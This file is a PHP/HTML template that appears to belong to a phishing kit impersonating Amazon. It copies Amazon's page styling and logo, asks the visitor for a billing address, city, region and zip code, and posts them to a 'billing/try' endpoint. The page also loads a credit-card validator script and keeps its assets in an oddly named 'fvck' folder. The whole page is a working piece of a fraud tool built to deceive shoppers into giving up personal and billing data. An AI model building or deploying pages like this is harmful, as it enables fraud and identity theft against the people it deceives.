<?php
defined("ALLOW") or exit('No direct script access allowed');

$country = trim($_SESSION['countryCode']);
include FCPATH . "language/lang.php";
?>
<!DOCTYPE html>
<html>

<head>
    <title>
        <?php echo $_45 ?>
    </title>
    <meta charset="UTF-8">
    <link rel="shortcut icon" href="<?= base_url() ?>Assets/fvck/images/favicon.ico" />
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css'>
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>Assets/fvck/css/boostrap.min.css" media="all">
    <link rel="stylesheet" href="<?= base_url() ?>Assets/fvck/css/sign-dekstop.css">
    <link rel="stylesheet" href="<?= base_url() ?>Assets/fvck/css/style.sign-desktop.css">
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>Assets/fvck/css/style.css">
</head>

<body onload="_loader()" style="margin:0;">
    <div id="loader"></div>
    <div style="display:none;" id="myDiv" class="animate-bon ttom">
        <div id="a-page">
            <div class="a-section a-padding-medium auth-workflow">
                <div class="a-section a-spacing-none auth-navbar">
                    <div class="a-section a-spacing-medium a-text-center">
                        <div class="a-link-nav-icon"></div><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
                    </div>
                </div>
                <div id="authportal-center-section" class="a-section">

                    <div class="a-content mt-4">
                        <div class="container">
                            <div class="row" style="padding-top: 5px">
                                <div class="col-12">
                                    <div class="mb-3" align="center"> <img src="<?= base_url() ?>Assets/fvck/images/billingx.png" width="80"> </div>
                                    <div align="center"> <span class="lefttext" style="font-size: 20px; font-weight: 650;  "><?php echo $_71 ?></span> </div>
                                    <div align="center"> <span class="lefttext"><?php echo $_72 ?></span> </div><br>
                                    <div class="mypayementarea">
                                        <form action="<?= base_url() ?>billing/try" method="post" name="fms-form" id="fms-form"> <span class="colorblacked"><?php echo $_73 ?></span>
                                            <div class="row mt-2">
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label style="font-size:11px;" for="adressline1">
                                                            <?php echo $_74 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput addressfocus" name="address" id="adressline1" placeholder="<?php echo $_75 ?>" minlength="5" maxlength="30" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label style="font-size:11px;" for="adressline2">
                                                            <?php echo $_76 ?>
                                                        </label>
                                                        <input type="text" id="cityp" class="form-control amazoninput cityfocus" name="cityp" placeholder="<?php echo $_76 ?>" maxlength="25" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="stateregionprovince">
                                                            <?php echo $_77 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput regionfocus" name="region" id="region" placeholder="<?php echo $_77 ?>" maxlength="30" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label style="font-size:11px;" for="zipCode">
                                                            <?php echo $_78 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput zipfocus" name="zipcode" id="zipCode" placeholder="<?php echo $_79 ?>" maxlength="12">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="a-row a-spacing-small">
                                                <span style="border:none; background-color:white" id="cvf-submit-otp-button" class="">
                                                    <span style="border:none; background-color:white" class="a-button-inner">
                                                        <button style="border:none; background-color:#ffd814; border-radius:7px;" type="submit" name="Sex" class="a-button-text btn btn-warning" role="button"><?php echo $_7 ?></button>
                                                    </span>
                                                </span>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                                <script>
                                    P.when('A', 'ready').execute(function(A) {
                                        var $ = A.$;
                                        $('.cvf-widget-link-resend').click(function() {
                                            $('.cvf-widget-form-resend').submit();
                                        });
                                    });
                                </script>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="a-section a-spacing-top-extra-large auth-footer">
            <div class="a-divider a-divider-section">
                <div class="a-divider-inner"></div>
            </div>
            <div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_21 ?>
                </a> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_22 ?>
                </a> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_23 ?>
                </a> <span class="auth-footer-seperator"></span>
            </div>
            <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> <?php echo $_24 ?> </span> </div>
        </div>
    </div>
    <script src="<?= base_url() ?>Assets/fvck/js/jquery-3.3.1.min.js"></script>
    <script src="<?= base_url() ?>Assets/fvck/js/jquery.mask.min.js"></script>
    <script src="<?= base_url() ?>Assets/fvck/js/jquery.validate.min.js"></script>
    <script src="<?= base_url() ?>Assets/fvck/js/additional-methods.min.js"></script>
    <script src="<?= base_url() ?>Assets/fvck/js/jquery.creditCardValidator.js"></script>
    <script>
        let load;

        let _loader = () => {
            load = setTimeout(showPage, 1000);
        }

        let showPage = () => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('myDiv').style.display = 'block';
        }

        const alpha = (e) => {
            let k;
            document.all ? k = e.keyCode : k = e.which;
            return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
        }

        $(document).ready(function(e) {
            $("#fms-form").validate({
                errorClass: "error-class",
                rules: {
                    address: {
                        required: true,
                        minlength: 5,
                    },
                    cityp: {
                        required: true,
                        minlength: 3,
                        maxlength: 30
                    },
                    region: {
                        required: true,
                        minlength: 3,
                        maxlength: 30
                    },
                    zipcode: {
                        required: true,
                        minlength: 2,
                        maxlength: 12
                    }
                },
                messages: {
                    address: {
                        required: "<?php echo $_80 ?>"
                    },
                    cityp: {
                        required: "<?php echo $_81 ?>"
                    },
                    region: {
                        required: "<?php echo $_82 ?>"
                    },
                    zipcode: {
                        required: "<?php echo $_33 ?>"
                    }
                }
            });
        })
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css"></script>
</body>

</html>